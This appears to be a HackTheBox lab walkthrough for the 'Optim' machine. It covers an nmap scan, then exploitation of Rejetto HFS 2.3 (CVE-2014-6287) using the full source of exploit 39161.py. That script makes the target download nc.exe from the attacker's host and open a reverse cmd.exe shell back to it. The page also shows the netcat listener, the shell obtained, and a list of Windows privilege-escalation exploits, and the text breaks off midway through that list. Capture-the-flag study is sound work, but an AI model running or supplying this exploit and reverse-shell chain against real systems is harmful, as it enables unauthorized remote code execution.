<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox Walkthrough - Optim | x64.moe</title>
<meta name=keywords content><meta name=description content="About Optim
Optim
Nmap
Port scan result
# nmap -sV -sT -sC --script=vuln -oA nmap_result.txt 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-03 09:55 EST
Stats: 0:06:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 10:01 (0:00:02 remaining)
Stats: 0:14:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 10:10 (0:00:06 remaining)
Nmap scan report for 10.10.10.8
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://www.mkit.com.ar/labs/htexploit/
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      http://capec.mitre.org/data/definitions/274.html
|_http-server-header: HFS 2.3
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1150.10 seconds
Web browsing
Accessed with browser"><meta name=author content="FAMASoon"><link rel=canonical href=http://localhost:1313/posts/optim/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/optim/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZJPXHR8YPR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-ZJPXHR8YPR")}</script><meta property="og:title" content="HackTheBox Walkthrough - Optim"><meta property="og:description" content="About Optim
Optim
Nmap
Port scan result
# nmap -sV -sT -sC --script=vuln -oA nmap_result.txt 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-03 09:55 EST
Stats: 0:06:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 10:01 (0:00:02 remaining)
Stats: 0:14:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 10:10 (0:00:06 remaining)
Nmap scan report for 10.10.10.8
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://www.mkit.com.ar/labs/htexploit/
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      http://capec.mitre.org/data/definitions/274.html
|_http-server-header: HFS 2.3
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1150.10 seconds
Web browsing
Accessed with browser"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/optim/"><meta property="og:image" content="http://localhost:1313/static/famasoon.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-11-04T00:00:00+00:00"><meta property="article:modified_time" content="2019-11-04T00:00:00+00:00"><meta property="og:site_name" content="x64.moe"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/static/famasoon.jpg"><meta name=twitter:title content="HackTheBox Walkthrough - Optim"><meta name=twitter:description content="About Optim
Optim
Nmap
Port scan result
# nmap -sV -sT -sC --script=vuln -oA nmap_result.txt 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-03 09:55 EST
Stats: 0:06:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 10:01 (0:00:02 remaining)
Stats: 0:14:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 10:10 (0:00:06 remaining)
Nmap scan report for 10.10.10.8
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://www.mkit.com.ar/labs/htexploit/
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      http://capec.mitre.org/data/definitions/274.html
|_http-server-header: HFS 2.3
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1150.10 seconds
Web browsing
Accessed with browser"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"HackTheBox Walkthrough - Optim","item":"http://localhost:1313/posts/optim/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Walkthrough - Optim","name":"HackTheBox Walkthrough - Optim","description":"About Optim Optim\nNmap Port scan result\n# nmap -sV -sT -sC --script=vuln -oA nmap_result.txt 10.10.10.8 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-03 09:55 EST Stats: 0:06:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.32% done; ETC: 10:01 (0:00:02 remaining) Stats: 0:14:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.32% done; ETC: 10:10 (0:00:06 remaining) Nmap scan report for 10.10.10.8 Host is up (0.25s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_http-csrf: Couldn\u0026#39;t find any CSRF vulnerabilities. |_http-dombased-xss: Couldn\u0026#39;t find any DOM based XSS. | http-fileupload-exploiter: | |_ Couldn\u0026#39;t find a file-type field. | http-method-tamper: | VULNERABLE: | Authentication bypass by HTTP verb tampering | State: VULNERABLE (Exploitable) | This web server contains password protected resources vulnerable to authentication bypass | vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the | common HTTP methods and in misconfigured .htaccess files. | | Extra information: | | URIs suspected to be vulnerable to HTTP verb tampering: | /~login [GENERIC] | | References: | http://www.mkit.com.ar/labs/htexploit/ | https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29 | http://www.imperva.com/resources/glossary/http_verb_tampering.html |_ http://capec.mitre.org/data/definitions/274.html |_http-server-header: HFS 2.3 |_http-stored-xss: Couldn\u0026#39;t find any stored XSS vulnerabilities. | http-vuln-cve2011-3192: | VULNERABLE: | Apache byterange filter DoS | State: VULNERABLE | IDs: BID:49303 CVE:CVE-2011-3192 | The Apache web server is vulnerable to a denial of service attack when numerous | overlapping byte ranges are requested. | Disclosure date: 2011-08-19 | References: | https://www.tenable.com/plugins/nessus/55976 | https://www.securityfocus.com/bid/49303 | https://seclists.org/fulldisclosure/2011/Aug/175 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1150.10 seconds Web browsing Accessed with browser\n","keywords":[],"articleBody":"About Optim Optim\nNmap Port scan result\n# nmap -sV -sT -sC --script=vuln -oA nmap_result.txt 10.10.10.8 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-03 09:55 EST Stats: 0:06:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.32% done; ETC: 10:01 (0:00:02 remaining) Stats: 0:14:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.32% done; ETC: 10:10 (0:00:06 remaining) Nmap scan report for 10.10.10.8 Host is up (0.25s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_http-csrf: Couldn't find any CSRF vulnerabilities. |_http-dombased-xss: Couldn't find any DOM based XSS. | http-fileupload-exploiter: | |_ Couldn't find a file-type field. | http-method-tamper: | VULNERABLE: | Authentication bypass by HTTP verb tampering | State: VULNERABLE (Exploitable) | This web server contains password protected resources vulnerable to authentication bypass | vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the | common HTTP methods and in misconfigured .htaccess files. | | Extra information: | | URIs suspected to be vulnerable to HTTP verb tampering: | /~login [GENERIC] | | References: | http://www.mkit.com.ar/labs/htexploit/ | https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29 | http://www.imperva.com/resources/glossary/http_verb_tampering.html |_ http://capec.mitre.org/data/definitions/274.html |_http-server-header: HFS 2.3 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. | http-vuln-cve2011-3192: | VULNERABLE: | Apache byterange filter DoS | State: VULNERABLE | IDs: BID:49303 CVE:CVE-2011-3192 | The Apache web server is vulnerable to a denial of service attack when numerous | overlapping byte ranges are requested. | Disclosure date: 2011-08-19 | References: | https://www.tenable.com/plugins/nessus/55976 | https://www.securityfocus.com/bid/49303 | https://seclists.org/fulldisclosure/2011/Aug/175 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1150.10 seconds Web browsing Accessed with browser\nThis machine is using HFS.\nSearchsploit I found HFS vulnerability.\n# searchsploit HFS -------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service | exploits/osx/dos/29454.txt Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service) | exploits/osx/dos/12375.c Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure | exploits/osx/local/35488.c Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation | exploits/osx/local/8266.txt FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution | exploits/windows/remote/37985.py Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service | exploits/linux/dos/28895.txt Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | exploits/windows/remote/34926.rb Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | exploits/windows/remote/31056.py Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | exploits/multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | exploits/windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | exploits/windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | exploits/windows/webapps/34852.txt -------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result I used RCE exploit code exploits/windows/remote/39161.py\n# cp /usr/share/exploitdb/exploits/windows/remote/39161.py The contents of 39161.py are as follows. (I rewrite ip_addr and local_port)\n#!/usr/bin/python # Exploit Title: HttpFileServer 2.3.x Remote Command Execution # Google Dork: intext:\"httpfileserver 2.3\" # Date: 04-01-2016 # Remote: Yes # Exploit Author: Avinash Kumar Thapa aka \"-Acid\" # Vendor Homepage: http://rejetto.com/ # Software Link: http://sourceforge.net/projects/hfs/ # Version: 2.3.x # Tested on: Windows Server 2008 , Windows 8, Windows 7 # CVE : CVE-2014-6287 # Description: You can use HFS (HTTP File Server) to send and receive files. # It's different from classic file sharing because it uses web technology to be more compatible with today's Internet. # It also differs from classic web servers because it's very easy to use and runs \"right out-of-the box\". Access your remote files, over the network. It has been successfully tested with Wine under Linux. #Usage : python Exploit.py #EDB Note: You need to be using a web server hosting netcat (http://:80/nc.exe). # You may need to run it multiple times for success! import urllib2 import sys try: def script_create(): urllib2.urlopen(\"http://\"+sys.argv[1]+\":\"+sys.argv[2]+\"/?search=%00{.+\"+save+\".}\") def execute_script(): urllib2.urlopen(\"http://\"+sys.argv[1]+\":\"+sys.argv[2]+\"/?search=%00{.+\"+exe+\".}\") def nc_run(): urllib2.urlopen(\"http://\"+sys.argv[1]+\":\"+sys.argv[2]+\"/?search=%00{.+\"+exe1+\".}\") ip_addr = \"10.10.14.9\" #local IP address local_port = \"8888\" # Local Port number vbs = \"C:\\Users\\Public\\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F\"+ip_addr+\"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with\" save= \"save|\" + vbs vbs2 = \"cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs\" exe= \"exec|\"+vbs2 vbs3 = \"C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20\"+ip_addr+\"%20\"+local_port exe1= \"exec|\"+vbs3 script_create() execute_script() nc_run() except: print \"\"\"[.]Something went wrong..! Usage is :[.] python exploit.py Don't forgot to change the Local IP address and Port number on the script\"\"\" Find nc.exe and copy it for 39161.py. And start the HTTP server so that the target machine can download nc.exe.\n# locate nc.exe /usr/share/sqlninja/apps/nc.exe /usr/share/windows-resources/binaries/nc.exe # cp /usr/share/windows-resources/binaries/nc.exe # python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Execute nc\n# nc -lnvp 8888 listening on [any] 8888 ... Execute 39161.py.\n# ./39161.py 10.10.10.8 80 If the following message appears in the HTTPS server log, it is successful.\n10.10.10.8 - - [03/Nov/2019 11:17:40] \"GET /nc.exe HTTP/1.1\" 200 - I got a Windows reverse shell.\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.8] 49190 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop\u003e I got user flag.\nC:\\Users\\kostas\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of C:\\Users\\kostas\\Desktop 10/11/2019 01:53 �� . 10/11/2019 01:53 �� .. 18/03/2017 02:11 �� 760.320 hfs.exe 18/03/2017 02:13 �� 32 user.txt.txt 2 File(s) 760.352 bytes 2 Dir(s) 31.895.023.616 bytes free C:\\Users\\kostas\\Desktop\u003etype user.txt.txt Privilege Escalation I checked systeminfo.\nC:\\Users\\kostas\\Desktop\u003esysteminfo systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-70000-00000-AA535 Original Install Date: 18/3/2017, 1:51:36 �� System Boot Time: 10/11/2019, 1:51:48 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest Total Physical Memory: 4.095 MB Available Physical Memory: 3.481 MB Virtual Memory: Max Size: 5.503 MB Virtual Memory: Available: 4.930 MB Virtual Memory: In Use: 573 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: \\\\OPTIMUM Hotfix(s): 31 Hotfix(s) Installed. [01]: KB2959936 [02]: KB2896496 [03]: KB2919355 [04]: KB2920189 [05]: KB2928120 [06]: KB2931358 [07]: KB2931366 [08]: KB2933826 [09]: KB2938772 [10]: KB2949621 [11]: KB2954879 [12]: KB2958262 [13]: KB2958263 [14]: KB2961072 [15]: KB2965500 [16]: KB2966407 [17]: KB2967917 [18]: KB2971203 [19]: KB2971850 [20]: KB2973351 [21]: KB2973448 [22]: KB2975061 [23]: KB2976627 [24]: KB2977629 [25]: KB2981580 [26]: KB2987107 [27]: KB2989647 [28]: KB2998527 [29]: KB3000850 [30]: KB3003057 [31]: KB3014442 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.8 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. I used this tool to check for vulnerabilities from systeminfo. https://github.com/AonCyberLabs/Windows-Exploit-Suggester\n# git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester # cd Windows-Exploit-Suggester # ./windows-exploit-suggester.py --update [*] initiating... [*] successfully requested base url [*] scraped ms download url [+] writing to file 2019-11-03-mssb.xls [*] done And create systeminfo as text file(File Name: systeminfo.txt) Next, check vuln with windows-exploit-suggester.py.\n# ./windows-exploit-suggester.py -d ./2019-11-03-mssb.xls --systeminfo ./systeminfo.txt [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (utf-8) [*] querying database file for potential vulnerabilities [*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits [*] there are now 246 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as 'Windows 2012 R2 64-bit' [*] [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important [*] https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135) [*] https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2) [*] https://github.com/tinysec/public/tree/master/CVE-2016-7255 [*] [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important [*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) [*] [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important [*] https://github.com/foxglovesec/RottenPotato [*] https://github.com/Kevin-Robertson/Tater [*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege [*] https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation [*] [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important [*] https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC [*] https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC [*] [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical [*] https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC [*] [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important [*] https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF [*] https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC [*] https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 \u0026 Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC [*] https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 \u0026 Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#) [*] [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important [*] https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF [*] https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC [*] https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC [*] [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important [*] Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC [*] [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important [*] https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC [*] https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC [*] [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important [*] https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC [*] https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC [*] [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical [*] https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112) [*] [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important [*] https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC [*] [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important [*] https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC [*] https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC [*] https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC [*] [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical [*] https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC [*] https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC [*] [M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical [*] https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow [*] [E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important [*] https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC [*] [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important [*] https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC [*] https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF [*] [E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical [*] https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC [*] https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC [*] https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC [*] [E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important [*] http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 